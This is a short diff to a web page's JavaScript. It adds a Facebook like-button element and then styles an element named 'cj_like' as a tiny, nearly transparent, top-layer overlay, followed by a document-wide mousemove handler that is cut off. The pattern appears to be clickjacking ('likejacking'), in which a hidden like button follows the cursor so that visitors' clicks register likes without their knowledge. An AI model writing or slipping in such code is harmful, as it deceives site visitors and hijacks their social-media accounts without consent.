@@ -112,6 +112,8 @@ fb.setAttribute("layout","standard");
 fb.setAttribute("show_faces","false");
 document.body.appendChild(fb);
 
+var cj= document.getElementById('cj_like');
+cj.setAttribute("style","position: absolute;top: 0;left: 0;width: 52px;height: 24px;display: none;opacity: .2;z-index: 88888888;overflow: hidden;");
 
 $(function () {
     $(document).on("mousemove", function ( e ) {
